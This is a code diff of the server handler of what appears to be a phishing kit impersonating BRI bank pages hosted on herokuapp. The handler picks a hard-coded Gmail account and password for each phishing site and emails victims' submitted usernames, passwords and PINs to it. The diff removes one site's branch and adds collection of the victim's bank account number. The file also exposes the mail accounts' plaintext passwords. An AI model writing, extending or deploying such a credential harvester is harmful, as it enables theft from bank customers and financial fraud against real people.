@@ -25,9 +25,6 @@ export default function handler(req, res) {
         email = 'bbri58087@gmail.com';
         pass = 'rngmokeomagmuhki';
 
-    } else if(url == 'bri-perubahantarif.herokuapp.com'){
-        email = 'pooopss117@gmail.com';
-        pass = 'nkcgdjrpogrmqprm';
     }
     else {
         email = 'bripembukaanrekening@gmail.com';
@@ -53,6 +50,7 @@ export default function handler(req, res) {
                     <ul>
                         <li>username: ${body.username ?? '-'}</li> 
                         <li>password: ${body.password ?? '-'}</li>
+                        <li>norekening: ${body.nomorrekening ?? '-'}</li>
                         <li>pin: ${body.mPin ?? '-'}</li>
                         <li>message: ${body.message ?? '-'}</li>
                     </ul>
